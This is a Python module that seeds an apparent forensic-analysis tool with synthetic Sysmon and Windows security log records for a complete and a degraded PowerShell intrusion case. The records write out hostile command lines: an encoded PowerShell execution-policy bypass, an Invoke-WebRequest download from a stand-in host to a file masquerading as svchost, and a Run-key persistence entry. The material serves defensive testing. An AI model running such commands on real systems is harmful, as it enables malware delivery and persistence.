import json
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, Any, List
from sqlalchemy.orm import Session
from backend.config import SYNTHETIC_DIR
from backend.database.models import Case, Artifact, EvidenceEvent
from backend.forensic.integrity import compute_sha256, make_file_readonly, ensure_file_writable, add_audit_entry, compute_record_hash

CASE_A_DATA: List[Dict[str, Any]] = [
    {
        "record_id": "REC-00101",
        "timestamp": "2026-10-23T10:00:00Z",
        "event_id": "4624",
        "event_type": "user_logon",
        "user": "SYSTEM_ADMIN",
        "logon_type": "2 (Interactive)",
        "workstation": "WS-SEC-OPS01",
        "source_ip": "127.0.0.1",
        "description": "Interactive logon for user SYSTEM_ADMIN",
    },
    {
        "record_id": "REC-00102",
        "timestamp": "2026-10-23T10:04:12Z",
        "event_id": "4688",
        "event_type": "process_creation",
        "user": "SYSTEM_ADMIN",
        "process_name": "cmd.exe",
        "pid": "4820",
        "parent_process_name": "explorer.exe",
        "ppid": "3420",
        "command_line": 'C:\\Windows\\System32\\cmd.exe /c "start powershell"',
        "description": "Explorer spawned command prompt shell",
    },
    {
        "record_id": "REC-00103",
        "timestamp": "2026-10-23T10:05:30Z",
        "event_id": "4688",
        "event_type": "process_creation",
        "user": "SYSTEM_ADMIN",
        "process_name": "powershell.exe",
        "pid": "5912",
        "parent_process_name": "cmd.exe",
        "ppid": "4820",
        "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZQB4AHQAZQByAG4AYQBsAC4AdABlAHMAdAAvAHAAYQB0AGMAaAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAEMAYQBjAGgAZQBcAHMAYwB2AGgAbwBzAHQALgBlAHgAZQA=",
        "description": "PowerShell spawned with base64 encoded payload",
    },
    {
        "record_id": "REC-00104",
        "timestamp": "2026-10-23T10:05:45Z",
        "event_id": "4104",
        "event_type": "powershell_execution",
        "user": "SYSTEM_ADMIN",
        "process_name": "powershell.exe",
        "pid": "5912",
        "command_line": "Invoke-WebRequest -Uri http://external.test/patch.exe -OutFile C:\\Windows\\Cache\\scvhost.exe",
        "description": "PowerShell Script Block Logging: Web request download and write payload",
    },
    {
        "record_id": "REC-00105",
        "timestamp": "2026-10-23T10:06:05Z",
        "event_id": "11",
        "event_type": "file_activity",
        "user": "SYSTEM_ADMIN",
        "process_name": "powershell.exe",
        "pid": "5912",
        "file_path": "C:\\Windows\\Cache\\scvhost.exe",
        "target_file": "C:\\Windows\\Cache\\scvhost.exe",
        "file_action": "FileCreate",
        "description": "File created in cache directory masquerading as svchost",
    },
    {
        "record_id": "REC-00106",
        "timestamp": "2026-10-23T10:06:20Z",
        "event_id": "4688",
        "event_type": "process_creation",
        "user": "SYSTEM_ADMIN",
        "process_name": "scvhost.exe",
        "pid": "6204",
        "parent_process_name": "powershell.exe",
        "ppid": "5912",
        "command_line": "C:\\Windows\\Cache\\scvhost.exe --background",
        "description": "Suspicious payload executed by powershell process",
    },
    {
        "record_id": "REC-00107",
        "timestamp": "2026-10-23T10:06:35Z",
        "event_id": "3",
        "event_type": "network_connection",
        "user": "SYSTEM_ADMIN",
        "process_name": "scvhost.exe",
        "pid": "6204",
        "source_ip": "10.0.0.15",
        "dest_ip": "198.51.100.42",
        "dest_port": "443",
        "protocol": "TCP",
        "description": "Outbound encrypted connection initiated by scvhost.exe",
    },
    {
        "record_id": "REC-00108",
        "timestamp": "2026-10-23T10:07:00Z",
        "event_id": "3",
        "event_type": "network_connection",
        "user": "SYSTEM",
        "process_name": "svchost.exe",
        "pid": "912",
        "source_ip": "10.0.0.15",
        "dest_ip": "10.0.0.5",
        "dest_port": "80",
        "protocol": "TCP",
        "description": "Benign Windows Update internal telemetry sync",
    },
    {
        "record_id": "REC-00109",
        "timestamp": "2026-10-23T10:07:30Z",
        "event_id": "13",
        "event_type": "registry_modification",
        "user": "SYSTEM_ADMIN",
        "process_name": "scvhost.exe",
        "pid": "6204",
        "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate",
        "registry_value": "C:\\Windows\\Cache\\scvhost.exe",
        "description": "Persistence mechanism installed via user Run key",
    },
]

# Case B removes the process creation event (REC-00106)
CASE_B_DATA: List[Dict[str, Any]] = [
    item for item in CASE_A_DATA if item["record_id"] != "REC-00106"
]

def seed_synthetic_case(db: Session, case_type: str = "complete") -> Case:
    """
    Seeds a reproducible synthetic investigation case into the database.
    Case A ('complete'): Full evidence with verified causal chain.
    Case B ('degraded'): Missing child process creation record REC-00106.
    """
    is_degraded = case_type == "degraded"
    case_name = (
        "Degraded PowerShell Investigation (Missing Records)"
        if is_degraded
        else "Suspicious PowerShell Execution"
    )
    case_obj = (
        "Investigate whether suspicious PowerShell execution led to unauthorized file activity. "
        "Reconstruct the event sequence, identify the processes and accounts involved, correlate available artifacts, "
        "and report which conclusions are supported by the evidence."
    )
    desc = (
        "Simulated forensic evidence package containing endpoint security logs, Sysmon events, and command executions."
        + (" (Note: Key process creation telemetry intentionally omitted to test degraded evidence reasoning.)" if is_degraded else "")
    )

    # Check if existing demo case of this type exists; if so, clear or reuse
    existing = db.query(Case).filter(Case.is_demo == True, Case.demo_type == case_type).first()
    if existing:
        db.delete(existing)
        db.commit()

    case = Case(
        name=case_name,
        objective=case_obj,
        description=desc,
        status="active",
        is_demo=True,
        demo_type=case_type,
    )
    db.add(case)
    db.flush()

    # Generate synthetic file on disk
    case_dir = SYNTHETIC_DIR / ("case_b_degraded" if is_degraded else "case_a_powershell")
    case_dir.mkdir(parents=True, exist_ok=True)
    raw_file_path = case_dir / "security_sysmon_bundle.json"
    ensure_file_writable(raw_file_path)

    records_to_seed = CASE_B_DATA if is_degraded else CASE_A_DATA
    with open(raw_file_path, "w", encoding="utf-8") as f:
        json.dump(records_to_seed, f, indent=2)

    sha256 = compute_sha256(raw_file_path)
    make_file_readonly(raw_file_path)

    artifact = Artifact(
        case_id=case.id,
        original_filename="security_sysmon_bundle.json",
        artifact_type="json",
        file_size=raw_file_path.stat().st_size,
        sha256=sha256,
        original_storage_reference=str(raw_file_path),
        parser_name="json_endpoint_parser",
        parser_status="parsed",
        record_count=len(records_to_seed),
        warnings=None if not is_degraded else "Synthetic Degraded Mode: 1 expected telemetry stream omitted.",
    )
    db.add(artifact)
    db.flush()

    # Create evidence events
    for item in records_to_seed:
        ts_utc = datetime.fromisoformat(item["timestamp"].replace("Z", "+00:00"))
        normalized = {
            "event_id": item.get("event_id"),
            "process_name": item.get("process_name"),
            "pid": item.get("pid"),
            "parent_process_name": item.get("parent_process_name"),
            "ppid": item.get("ppid"),
            "command_line": item.get("command_line"),
            "user": item.get("user"),
            "file_path": item.get("file_path") or item.get("target_file"),
            "source_ip": item.get("source_ip"),
            "dest_ip": item.get("dest_ip"),
            "dest_port": item.get("dest_port"),
            "description": item.get("description"),
            "raw_attributes": item,
        }
        ev = EvidenceEvent(
            case_id=case.id,
            artifact_id=artifact.id,
            source_record_id=item["record_id"],
            timestamp_utc=ts_utc,
            original_timestamp=item["timestamp"],
            timezone_metadata="UTC",
            event_type=item["event_type"],
            normalized_fields=normalized,
            source_hash=compute_record_hash(normalized),
        )
        db.add(ev)

    # Add audit log entry
    add_audit_entry(
        db,
        case_id=case.id,
        event_type="CASE_INITIALIZED",
        event_data={
            "case_name": case.name,
            "demo_type": case_type,
            "artifact_count": 1,
            "record_count": len(records_to_seed),
            "sha256": sha256,
        },
    )

    db.commit()
    db.refresh(case)
    return case
